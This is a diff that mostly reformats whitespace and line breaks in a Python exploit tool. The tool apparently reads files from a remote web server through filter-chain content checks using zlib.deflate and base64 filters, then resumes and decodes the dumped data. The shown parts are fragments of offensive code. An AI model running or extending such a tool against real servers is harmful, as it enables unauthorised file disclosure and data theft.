@@ -112,9 +112,9 @@ class Exploit:
 
         if not data:
             return
-        
+
         msg_info(f"File exists, resuming dump at digit [b]#{len(data)}[/]")
-        
+
         for digit in data:
             self.digits.append(PositionalDigit(len(self.digits), digit))
 
@@ -186,7 +186,9 @@ class Exploit:
         # will yield a few bytes. The additional base64-encode is to ensure that
         # the output is ASCII, and we don't encounter unexpected issues with decoding or
         # anything.
-        should_be_true = self.remote.has_contents(("zlib.deflate", "convert.base64-encode"), "data:,")
+        should_be_true = self.remote.has_contents(
+            ("zlib.deflate", "convert.base64-encode"), "data:,"
+        )
 
         if not should_be_true:
             msg_warning(
@@ -926,21 +928,22 @@ class RawDataHandler(DataHandler):
         elif data.endswith("="):
             data = data[:-2]
         return data
-    
+
 
 @dataclass
 class ZlibCompressedDataHandler(DataHandler):
     GZ_B64_EXT = ".gz.b64"
-    
+
     def edit_filters(self, filters: tuple[str]) -> tuple[str]:
         return ("zlib.deflate",) + filters
 
     def for_output(self, data: str) -> bytes:
         if self.exploit.output:
             Path(self.exploit.output + self.GZ_B64_EXT).write_text(data)
+
         remove_offset = len(data) - (len(data) % 4)
         data = data[:remove_offset]
-        
+
         data = base64.decode(data)
         obj = zlib.decompressobj(-zlib.MAX_WBITS)
         try:
@@ -952,11 +955,12 @@ class ZlibCompressedDataHandler(DataHandler):
 
     def for_display(self, data: str) -> str:
         return self.for_output(data).decode("utf-8", "replace")
-    
+
     def resume(self, path: str) -> str:
         data = Path(path + self.GZ_B64_EXT).read_text()
         return data
-    
+
+
 def fc(filters: list[str]) -> str:
     return "|".join(filters)
 
